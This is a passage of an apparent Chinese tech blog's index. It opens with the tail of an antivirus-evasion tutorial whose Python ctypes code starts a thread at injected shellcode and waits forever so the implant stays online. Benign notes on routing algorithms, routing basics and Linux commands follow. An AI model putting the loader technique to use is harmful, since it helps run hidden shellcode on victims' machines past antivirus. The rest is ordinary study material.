class="comment">#向线程函数传递的参数</span></span><br><span class="line">DWORD dwCreationFlags,                      <span class="comment">#线程创建属性</span></span><br><span class="line">LPDWORD lpThreadId                          <span class="comment">#保存新线程的id</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>方法</li></ul><p>创建一个线程从shellcode放置位置开始执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(0),                        #NULL，使用默认安全性</span><br><span class="line">    ctypes.c_int(0),                        #默认将使用与调用该函数的线程相同的栈空间大小  </span><br><span class="line">    ctypes.c_uint64(ptr),                   #定位到申请的内存所在的位置 </span><br><span class="line">    ctypes.c_int(0),                        #NULL，不需传递参数</span><br><span class="line">    ctypes.c_int(0),                        #属性为0，线程创建后立即激活</span><br><span class="line">    ctypes.pointer(ctypes.c_int(0))         #不想返回线程ID,设置值为NULL</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin">https://baike.baidu.com/item/CreateThread/8222652?fr=aladdin</a></p></blockquote><h2 id="等待创建的线程运行结束"><a href="#等待创建的线程运行结束" class="headerlink" title="等待创建的线程运行结束"></a>等待创建的线程运行结束</h2><p>上线结束后 我们才能退出，不然该程序执行完就会退出~~~~</p><p>调用 WaitForSingleObject  函数用来检测线程的状态</p><ul><li>函数原型</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DWORD WINAPI WaitForSingleObject(</span><br><span class="line">    __<span class="keyword">in</span> HANDLE hHandle,        <span class="comment">#对象句柄，可以指定一系列的对象</span></span><br><span class="line">    __<span class="keyword">in</span> DWORD dwMilliseconds   <span class="comment">#定时时间间隔，单位为毫秒</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>dwMilliseconds  如果指定一个非零值，函数处于等待状态直到 Handle （创建线程时返回的线程句柄）标记的对象被触发，或者时间到了。</p><p>为了保持创建的线程一直运行，因此将时间设置为负数，让函数一直处于等待状态，而不会结束运行。</p><ul><li>方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><blockquote><p>更多参考：<a href="https://baike.baidu.com/item/WaitForSingleObject/3534838?fr=aladdin">https://baike.baidu.com/item/WaitForSingleObject/3534838?fr=aladdin</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows DOS命令\批处理脚本学习</title>
      <link href="/2022-09-02-Coder/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022-09-02-Coder/Windows-DOS%E5%91%BD%E4%BB%A4-%E6%89%B9%E5%A4%84%E7%90%86%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> Coder </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>路由算法</title>
      <link href="/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E7%AE%97%E6%B3%95/"/>
      <url>/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="路由算法综述"><a href="#路由算法综述" class="headerlink" title="路由算法综述"></a><strong>路由算法综述</strong></h1><p>路由器转发分组是通过路由表转发的，而路由表是通过各种算法得到的。主机通常直接与一台路由器相连接，该路由器即为该主机的默认路由器(default router) ，又称该主机的第一跳路由器(first-hop router)每当主机发送一个分组时，该分组被传送给它的默认路由器。源主机的默认路由器称作源路由器(source router) ,目的主机的默认路由器称作目的路由器(destination router)。 一个分组从源主机到目的主机的路由选择问题显然可归结为从源路由器到目的路由器的路由选择问题。</p><blockquote><p>【路由选择算法的分类】</p><ul><li>1)静态路由算法（又称非自适应路由算法）</li><li>2)动态路由算法（又称自适应路由算法）</li></ul><blockquote><p> 从掌握网络拓扑信息的规模来看常用的动态路由算法可分为两类：</p><ul><li>距离－向量路由算法（分散路由选择算法）</li><li>链路状态路由算法（全局路由选择算法）</li></ul></blockquote></blockquote><h1 id="静态路由算法"><a href="#静态路由算法" class="headerlink" title="静态路由算法"></a><strong>静态路由算法</strong></h1><ul><li>由<strong>网络管理员手工配置路由信息</strong>。当网络的拓扑结构或链路的状态发生变化时，网络管理员需要手工去修改路由表中相关的静态路由信息。大型和复杂的网络环境通常不宜采用静态路由。</li></ul><blockquote><p>理由：</p><ul><li>网络管理员难以全面了解整个网络的拓扑结构</li><li>当网络的拓扑结构和链路状态发生变化时，路由器中的静态路由信息需要大范围地调整，这一工作的难度和复杂程度非常高</li><li>路由信息更新慢</li></ul></blockquote><ul><li>静态路由算法的优点是简便、可靠，在负荷稳定、拓扑变化不大的网络中运行效果很好，因此仍广泛用于高度安全的军事系统和较小的商业网络。且优先级高</li></ul><h1 id="动态路由算法"><a href="#动态路由算法" class="headerlink" title="动态路由算法"></a>动态路由算法</h1><p>动态路由算法能改善网络的性能并有助于流量控制；但算法复杂，会增加网络的负担，有时因对动态变化的反应太快而引起振荡，或反应太慢而影响网络路由的一致性，因此要仔细设计动态路由算法，以发挥其优势。</p><blockquote><p>特点：</p><ul><li>路由更新快</li><li>定期更新（周期性）</li></ul></blockquote><h2 id="距离-向量路由算法-RIP-分散路由选择算法"><a href="#距离-向量路由算法-RIP-分散路由选择算法" class="headerlink" title="距离-向量路由算法(RIP)-分散路由选择算法"></a><strong>距离-向量路由算法(RIP)</strong>-分散路由选择算法</h2><h3 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h3><blockquote><p>路由信息协议RIP（Routing Information Protocol）采用距离-向量算法，利用跳数来作为计量标准，在实际使用中已经较少适用。距离向量路由算法，是基于Bellman-Ford方程，也就是动态规划算法实现的。</p><p>在距离向量路由算法中，同样是计算由u到其他任意一点。但在这种算法中，u无需知道整个网络的拓扑结构。<strong>对u来说，最重要的事情是知道，如果需要把数据运往z，最合适的邻居节点究竟是哪一个</strong>。</p><p><strong>即节点只需获取最短路径的下一跳，无需知道整个网络拓扑的情况，并且该信息用于转发表中</strong>。</p></blockquote><h3 id="宏观："><a href="#宏观：" class="headerlink" title="宏观："></a>宏观：</h3><blockquote><p>在默认情况下，RIP使用一种非常简单的度量制度：距离就是通往目的站点所需经过的链路数，取值为0~16，数值16表示路径无限长。RIP进程使用UDP的520端口来发送和接收RIP分组。RIP分组每隔30s以广播的形式发送一次，为了防止出现“广播风暴”，其后续的分组将做随机延时后发送。在RIP中，如果一个路由在180s内未被刷新，则相应的距离就被设定成无穷大，并从路由表中删除该表项。RIP分组分为两种：请求分组和响应分组。</p></blockquote><h3 id="发送方-请求分组-："><a href="#发送方-请求分组-：" class="headerlink" title="发送方(请求分组)："></a>发送方(请求分组)：</h3><blockquote><p>在距离-向量路由算法中，所有结点都定期地将它们的整个路由选择表传送给所有与之直接相邻的结点。这种路由选择表包含：</p><ol><li>每条路径的目的地（另一结点）。</li><li>路径的代价（也称距离）。</li></ol><p>【注意】：</p><p>这里的距离是一个抽象的概念，如RIP 就将距离定义为“跳数＂。跳数指从源端口到达目的端口所经过的路由个数，每经过一个路由器，跳数加1 。</p></blockquote><h3 id="接收方-响应分组-："><a href="#接收方-响应分组-：" class="headerlink" title="接收方(响应分组)："></a>接收方(响应分组)：</h3><p>在这种算法中，所有结点都必须参与距离向量交换，以保证路由的有效性和一致性，也就是说，所有的结点都监听从其他结点传来的路由选择更新信息，并在下列情况下立刻更新它们的路由选择表：</p><ol><li>被通告一条新的路由，该路由在本结点的路由表中不存在，此时本地系统加入这条新的路由。</li><li>发来的路由信息中有一条到达某个目的地的路由，该路由与当前使用的路由相比，有较短的距离（较小的代价）。此种情况下，就用经过发送路由信息的结点的新路由替换路由表中到达那个目的地的现有路由。</li></ol><blockquote><p>总结起来如下图：（DV即为距离向量）</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011631793.png" alt="img" style="zoom:33%;" /></blockquote><h3 id="距离向量路由算法的实质"><a href="#距离向量路由算法的实质" class="headerlink" title="距离向量路由算法的实质"></a>距离向量路由算法的实质</h3><blockquote><p>迭代计算一条路由中的站段数或延迟时间，从而得到到达一个 目标的最短（最小代价）通路。它要求每个结点在每次更新时都将它的全部路由表发送给所有相邻的结点。显然，更新报文的大小与通信子网的结点个数成正比，大的通信子网将导致很大的更新报文。由于更新报文发给直接邻接的结点，所以所有结点都将参加路由选择信息交换。基于这些原因，在通信子网上传送的路由选择信息的数量很容易变得非常大。</p><p>距离向量路由算法是一种<strong>迭代的、异步的、分布式</strong>的算法。</p><ul><li><p>迭代很好理解，在每个节点只需要知道他的下一跳的目的地的情况下，想要求得最小路径，那么必然需要使用迭代，使得最短路径不断趋近于真实值。为什么说是不断趋近于真实值呢？一开始，也就是初始化时，结点只知道他到其邻居结点的距离，而不知道到其他结点的距离。这就必然造成此结点到其直接邻居结点的距离并非是最优的，可能是绕过一个或两个结点再到此结点的情况，才是最短的路径。</p></li><li><p>所谓异步的，是因为我们不要求结点的步调整齐一致，也就是计算最短路径的时间可以是不同的。实际上，时间基本上就是不同。</p></li><li><p>所谓分布式的，是说每个节点都能接收到来自其邻居的信息，并执行计算，然后再将计算结果分发给邻居，邻居再将收到的数据进行计算，如果发现了其他最短路径，那么就会更新自身的信息，又进入了一个迭代的过程。</p><p>整个算法中最重要的是这样一个方程：</p></li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011627203.png" alt="img" style="zoom:50%;" /></blockquote><h2 id="链路状态路由算法-OSPF-全局路由选择算法"><a href="#链路状态路由算法-OSPF-全局路由选择算法" class="headerlink" title="链路状态路由算法(OSPF)-全局路由选择算法"></a><strong>链路状态路由算法(OSPF)</strong>-全局路由选择算法</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在链路状态路由算法中，网络拓扑和所有的链路费用都是已知的。所有的结点或者说路由器都掌握着完整的网络拓扑和链路费用。</p><p>不论是链路状态路由算法还是距离向量选择算法，核心要义都是四个字：”<strong>最短路径</strong>“。并且知晓网络全貌，了解整个网络拓扑，那自然是会用到Prim和Dijkstra算法。</p><h3 id="它们执行下述两项任务"><a href="#它们执行下述两项任务" class="headerlink" title="它们执行下述两项任务:"></a>它们执行下述两项任务:</h3><ol><li>第一，主动测试所有邻接结点的状态。两个共享一条链接的结点是相邻结点，它们连接到同一条链路，或者连接到同一广播型物理网络。</li><li>第二，定期地将链路状态传播给所有其他结点。<code>典型的链路状态算法是OSPF算法。</code></li></ol><p>在一个链路状态路由选择中，一个结点检查所有直接链路的状态，并将所得的状态信息发送给网上的所有其他结点，而不是仅送给那些直接相连的结点。每个结点都用这种方式从网上所有其他的结点接收包含直接链路状态的路由选择信息。</p><p>每当链路状态报文到达时，路由结点便使用这些状态信息去更新自己的网络拓扑和状态“视野图”，一旦链路状态发生变化，结点就对更新的网络图利用Dijsktra最短路径算法重新计算路由，从单一的源出发计算到达**&#x3D;&#x3D;所有&#x3D;&#x3D;**目的结点的最短路径。</p><blockquote><p>【注意】</p><p>这是Dijsktra算法的一个实际应用</p></blockquote><h3 id="链路状态路由算法主要有三个特征："><a href="#链路状态路由算法主要有三个特征：" class="headerlink" title="链路状态路由算法主要有三个特征："></a>链路状态路由算法主要有三个特征：</h3><ol><li>向本自治系统中所有路由器发送信息，这里使用的方法是泛洪法，即路由器通过所有端口向所有相邻的路由器发送信息。而每个相邻路由器又将此信息发往其所有相邻路由器（但不再发送给刚刚发来信息的那个路由器）。</li></ol><blockquote><p>【洪泛法小知识】</p><p>洪泛法（Flooding）是一种简单的路由算法，将收到的封包，往所有的可能连结路径上递送，直到封包到达为止。洪泛法被使用在桥接器上，Usenet以及点对点档案分享等。部份的路由协定也以洪泛法为基础，例如开放式最短路径优先（OSPF）、距离向量群体广播路由协定(DistanceVectorMulticastRoutingProtocol，DVMRP)。无线随意网络也使用洪泛法来进行路由。</p></blockquote><ol start="2"><li><p>发送的信息是与路由器相邻的所有路由器的链路状态，但这只是路由器所知道的部分信息。所谓“链路状态”，是指说明本路由器与哪些路由器相邻及该链路的“度量”。对于OSPF 算法，链路状态的＂度量”主要用来表示费用、距离、时延、带宽等。</p></li><li><p>只有当链路状态发生变化时，路由器才向所有路由器发送此消息。由于一个路由器的链路状态只涉及相邻路由器的连通状态，而与整个互联网的规模并无直接关系，因此链路状态路由算法可以用于大型的或路由信息变化聚敛的互联网环境。</p></li></ol><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>每个路由结点都使用同样的原始状态数据独立地计算路径，而不依赖中间结点的计算；</li><li>链路状态报文不加改变地传播，因此采用该算法易于查找故障。当一个结点从所有其他结点接收到报文时，它可以在本地立即计算正确的通路，保证一步汇聚。</li><li>由于链路状态报文仅运载来自单个结点关于直接链路的信息，其大小与网络中的路径结点数目无关，因此链路状态算法比距离-向量算法有更好的规模可伸展性。</li></ul><h2 id="距离-向量路由算法与链路状态路由算法的比较："><a href="#距离-向量路由算法与链路状态路由算法的比较：" class="headerlink" title="距离-向量路由算法与链路状态路由算法的比较："></a>距离-向量路由算法与链路状态路由算法的比较：</h2><blockquote><p>在距离-向量路由算法中，每个结点仅与它 的直接邻居交谈，它为它的邻居提供从自已到网络中所有其他结点的最低费用估计。在链路状态 路由算法中，每个结点通过广播的方式与所有其他结点交谈，但它仅告诉它们与它直接相连的链 路的费用。相较之下，距离-向量路由算法有可能遇到路由环路等问题。</p><ul><li>【路由环路问题】：</li></ul><p>在维护路由表信息的时候，如果在拓扑发生改变后，网络收敛缓慢产生了不协调或者矛盾的路由选择条目，就会发生路由环路的问题，这种条件下，路由器对无法到达的网络路由不予理睬，导致用户的数据包不停在网络上循环发送，最终造成网络资源的严重浪费。</p><p> OSPF(Open Shortest Path First开放式最短路径优先）是对链路状态路由协议的一种实现，著名的迪克斯加算法被用来计算最短路径树。OSPF支持负载均衡和基于服务类型的选路，也支持多种路由形式，如特定主机路由和子网路由等。OSPF的简单说就是两个相邻的路由器通过发报文的形式成为邻居关系，邻居再相互发送链路状态信息形成邻接关系，之后各自根据最短路径算法算出路由，放在OSPF路由表，OSPF路由与其他路由比较后优的加入全局路由表。</p></blockquote><h1 id="层次路由"><a href="#层次路由" class="headerlink" title="层次路由"></a><strong>层次路由</strong></h1><p>当网络规模扩大时，路由器的路由表成比例地增大。这不仅会消耗越来越多的路由器缓冲区空间，而且需要用更多CPU 时间来扫描路由表，用更多的带宽来交换路由状态信息。因此路由选择必须按照层次的方式进行。</p><p>因特网将整个互联网划分为许多较小的自治系统（注意一个自治系统中包含很多局域网），每个自治系统有权自主地决定本系统内应采用何种路由选择协议。如果两个自治系统需要通信，那么就需要一种在两个自治系统之间的协议来屏蔽这些差异。据此，因特网把路由选择协议划分为两大类</p><ol><li>一个自治系统内部所使用的路由选择协议称为内部网关协议(IGP), 也称域内路由选择，具体的协议有RIP 和OSPF 等。</li><li>自治系统之间所使用的路由选择协议称为外部网关协议(EGP), 也称域间路由选择，用在不同自治系统的路由器之间交换路由信息，并负责为分组在不同自治系统之间选择最优的路径。具体的协议有BGP 。</li></ol><h1 id="迪杰斯特拉算法（Dijkstra算法）"><a href="#迪杰斯特拉算法（Dijkstra算法）" class="headerlink" title="迪杰斯特拉算法（Dijkstra算法）"></a>迪杰斯特拉算法（Dijkstra算法）</h1><p>从一个例子开始</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011616799.png" alt="img" style="zoom:50%;" /><p>在上图中，我们以u为起点，计算u到z的最短路径。可见，若要计算u到z的路径，那么必须考虑全局信息。</p><p>实际上，迪杰斯特拉算法的核心内容是：找最小，然后找最小的邻居。</p><p>具体过程参考下图。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011617232.png" alt="img" style="zoom: 25%;" /><ol><li>初始化 ：与u相邻的置为权值，不与u相邻的置为无穷。 </li><li>找到最小 ：在上图中，与u相邻的权值最小的是（w，3），所以将w加入集合中。 </li><li>在其余中找最小 ：5为最小，则将x加入集合。经过x，可以到达z，这样最短，将z更新为14。 </li><li>接着找最小 ：6为最小，将v加入集合。经过uwv，可以到达y，最小值为10，则更新。 </li><li>依次类推，得到最终结果</li></ol><p>所以，我们能够得到最终的转发表。</p><table><thead><tr><th align="left">目的</th><th align="left">链路</th></tr></thead><tbody><tr><td align="left">v</td><td align="left">u-w-v</td></tr><tr><td align="left">x</td><td align="left">u-x</td></tr><tr><td align="left">y</td><td align="left">u-w-v-y</td></tr><tr><td align="left">w</td><td align="left">u-w</td></tr><tr><td align="left">z</td><td align="left">u-w-v-y-z</td></tr></tbody></table><h1 id="Prim算法——最小生成树"><a href="#Prim算法——最小生成树" class="headerlink" title="Prim算法——最小生成树"></a>Prim算法——最小生成树</h1><p>prim算法被用来求给定图的最小生成树</p><p>普里姆算法的实现思路是：</p><ol><li>将连通网中的所有顶点分为两类（假设为 A 类和 B 类）。初始状态下，所有顶点位于 B 类；</li><li>选择任意一个顶点，将其从 B 类移动到 A 类；</li><li>从 B 类的所有顶点出发，找出一条连接着 A 类中的某个顶点且权值最小的边，将此边连接着的 A 类中的顶点移动到 B 类；</li><li>重复执行第 3 步，直至 B 类中的所有顶点全部移动到 A 类，恰好可以找到 N-1 条边。</li></ol><p>举个例子，下图是一个连通网，使用普里姆算法查找最小生成树，需经历以下几个过程：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702115.gif" alt="img"><br>图 1 连通网<br>\1) 将图中的所有顶点分为 A 类和 B 类，初始状态下，A &#x3D; {}，B &#x3D; {A, B, C, D, S, T}。</p><p>\2) 从 B 类中任选一个顶点，假设选择 S 顶点，将其从 B 类移到 A 类，A &#x3D; {S}，B &#x3D; {A, B, C, D, T}。从 A 类的 S 顶点出发，到达 B 类中顶点的边有 2 个，分别是 S-A 和 S-C，其中 S-A 边的权值最小，所以选择 S-A 边组成最小生成树，将 A 顶点从 B 类移到 A 类，A &#x3D; {S, A}，B &#x3D; {B, C, D, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702093.gif" alt="img"><br>图 2 S-A 边组成最小生成树<br>\3) 从 A 类中的 S、A 顶点出发，到达 B 类中顶点的边有 3 个，分别是 S-C、A-C、A-B，其中 A-C 的权值最小，所以选择 A-C 组成最小生成树，将顶点 C 从 B 类移到 A 类，A &#x3D; {S, A, C}，B &#x3D; {B, D, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702109.gif" alt="img"><br>图 3 A-C 边组成最小生成树<br>\4) 从 A 类中的 S、A、C 顶点出发，到达 B 类顶点的边有 S-C、A-B、C-B、C-D，其中 C-D 边的权值最小，所以选择 C-D 组成最小生成树，将顶点 D 从 B 类移到 A 类，A &#x3D; {S, A, C, D}，B &#x3D; {B, T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702112.gif" alt="img"><br>图 4 C-D 边组成最小生成树<br>\5) 从 A 类中的 S、A、C、D 顶点出发，到达 B 类顶点的边有 A-B、C-B、D-B、D-T，其中 D-B 和 D-T 的权值最小，任选其中的一个，例如选择 D-B 组成最小生成树，将顶点 B 从 B 类移到 A 类，A &#x3D; {S, A, C, D, B}，B &#x3D; {T}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702103.gif" alt="img"><br>图 5 D-B 边组成最小生成树<br>\6) 从 A 类中的 S、A、C、D、B 顶点出发，到达 B 类顶点的边有 B-T、D-T，其中 D-T 的权值最小，选择 D-T 组成最小生成树，将顶点 T 从 B 类移到 A 类，A &#x3D; {S, A, C, D, B, T}，B &#x3D; {}。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011702137.gif" alt="img"><br>图 6 D-T 边组成最小生成树<br>\7) 由于 B 类中的顶点全部移到了 A 类，因此 S-A、A-C、C-D、D-B、D-T 组成的是一个生成树，而且是一个最小生成树，它的总权值为 17。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011703900.gif" alt="img"><br>图 7 最小生成树</p><blockquote><p><a href="http://c.biancheng.net/algorithm/prim.html">prim算法（普里姆算法）详解</a></p></blockquote><h1 id="Prim与Dijkstra算法的区别"><a href="#Prim与Dijkstra算法的区别" class="headerlink" title="Prim与Dijkstra算法的区别"></a>Prim与Dijkstra算法的区别</h1><p>两者的区别在于，每次更新路径的不一样</p><ul><li>prim更新的是未标记集合到已标记集合之间的距离</li><li>Dijkstra更新的是源点到未标记集合之间的距离</li></ul><p>Prim算法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">#更新lowcost</span></span><br><span class="line">    <span class="keyword">if</span>(lowcost[k] &gt; graph[v][k]):</span><br><span class="line">        lowcost[k] = graph[v][k]</span><br><span class="line">        mst[k] = v <span class="comment">#如果有被更新的权值，就把当前点作为被更新权值的那条边的起始点</span></span><br></pre></td></tr></table></figure><p>Dijkstra算法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span>(graph[v][k] &lt; MAX <span class="keyword">and</span> sign[k] <span class="keyword">and</span> graph[v][k] + <span class="built_in">dict</span>[v] &lt; <span class="built_in">dict</span>[k]):</span><br><span class="line">        <span class="built_in">dict</span>[k] = graph[v][k]+<span class="built_in">dict</span>[v]</span><br><span class="line">        parent[k] = v</span><br></pre></td></tr></table></figure><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><blockquote><ul><li><a href="https://zhuanlan.zhihu.com/p/87748517">https://zhuanlan.zhihu.com/p/87748517</a></li><li><a href="https://zhuanlan.zhihu.com/p/138122809">https://zhuanlan.zhihu.com/p/138122809</a></li><li><a href="https://cloud.tencent.com/developer/article/1595863">一文详解路由算法</a></li><li><a href="http://c.biancheng.net/algorithm/prim.html">prim算法（普里姆算法）详解</a></li><li><a href="https://www.bilibili.com/video/BV1Ea411V7gu?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=e73a152dada4626bad49c30d848902f7">路由器是如何路由的？（上集）</a></li></ul></blockquote><iframe src="//player.bilibili.com/player.html?aid=217578518&bvid=BV1Ea411V7gu&cid=819326392&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" width="100%" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts" height="100%" allowfullscreen="allowfullscreen"> </iframe>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由算法 </tag>
            
            <tag> Prim与Dijkstra算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由是什么</title>
      <link href="/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E6%98%AF%E4%BB%80%E4%B9%88/"/>
      <url>/2022-09-01-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%B1%82/%E8%B7%AF%E7%94%B1%E6%98%AF%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p><strong>路由是什么</strong></p><p>如下网络拓扑图，交换机0所在的网段为192.168.1.0&#x2F;24，交换机1所在网段为192.168.2.0&#x2F;24，且各自有2台主机：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539588.png" alt="image-20220901153925382"></p><p>假设192.168.1.10&#x2F;32的PC0要跟192.168.2.11&#x2F;32的PC4通信，如何实现？</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539602.png" alt="image-20220901153939464"></p><p>中间就需要一个路由器的东西。我们知道，PC0发出的数据包的目的地址是跨网段的，也就是需要<strong>出网关</strong>。网关是数据包出所在网段的出口。网关地址一般是所在网段的前一两个地址，且网关一般都集成在路由器中，称为<strong>下一跳</strong>。</p><p>子网中的每一台主机都需要配置好默认网关，即下一跳：PC0的默认网关为192.168.1.1&#x2F;32、PC4的默认网关为192.168.2.1&#x2F;32。这样子PC0要发给PC4的数据包会先抵达路由器的192.168.1.1&#x2F;32地址的网卡，路由器拿到该数据包后，将其从192.168.2.1&#x2F;32的网卡发送出去。也就是说，路由器在中间负责<strong>中转</strong>数据包。</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209011539379.png" alt="image-20220901153950236"></p><p>在如上拓扑图中，PC0还是要发数据包给PC4，当数据包抵达路由器1时，路由器1并不知道通往PC4的路径，于是需要在路由器1上的路由表上添加路由规则，使其知道应该将数据包发往192.168.2.0&#x2F;24网段的地址，需要走往哪一个路由器，这里是路由器2。其他路由器同理，直至到目的主机PC4。</p><p>网络畅通的条件是有去有回，所以当数据包从PC4返回PC0时，沿途的所有路由器都需要数据包的转法路径，也就是配置好返回的路由，使其知道数据包发往192.168.1.0&#x2F;24网段的地址需要走往哪一个路由器。</p><p>人为添加的路由称之为<strong>静态路由</strong>，但当路由器连接的网段太多时不方便配置静态路由，可以让路由器自行学习得到数据包的下一个中转地址，称之为<strong>动态路由</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> 网络层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常用命令及技巧</title>
      <link href="/2022-08-26-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&amp;Linux/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7/"/>
      <url>/2022-08-26-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%B7%A5%E5%85%B7+%E7%8E%AF%E5%A2%83/Kali&amp;Linux/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux常用命令"><a href="#Linux常用命令" class="headerlink" title="Linux常用命令"></a>Linux常用命令</h1><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示文件或目录</span></span><br><span class="line">Is        </span><br><span class="line">    -l         #列出文件详细信息Iist</span><br><span class="line">    -a(all)    #列出当前目录下所有文件及目录，包括隐藏的</span><br><span class="line">ll        #与ls不同，是列出所有文件的具体属性！</span><br><span class="line">ls -al    #是列出完整的全部，包括配置文件</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建目录，若无父目录，则创建p(parent)</span></span><br><span class="line">mkdir -p  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">回到用户根目录</span></span><br><span class="line">cd ~      </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建空文件</span></span><br><span class="line">touch     </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">创建带有内容的文件。<span class="built_in">echo</span>创建文件时一个&gt;表示覆盖文件，两个&gt;&gt;表示在文件尾追加</span></span><br><span class="line">echo      </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件内容，<span class="built_in">cat</span>是concatenate的简写，类似于dos下面的<span class="built_in">type</span>命令</span></span><br><span class="line">cat       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">拷贝</span></span><br><span class="line">cp       </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">移动或重命名</span></span><br><span class="line">mv        </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">分页显示文本文件内容，q键退出</span></span><br><span class="line">more</span><br><span class="line">less    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看目录</span></span><br><span class="line">pwd        </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用于查找文件。该指令会在特定目录中查找符合条件的文件。该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。</span></span><br><span class="line">whereis   </span><br><span class="line">where ls        #可以显示出ls命令所在目录</span><br><span class="line"><span class="meta 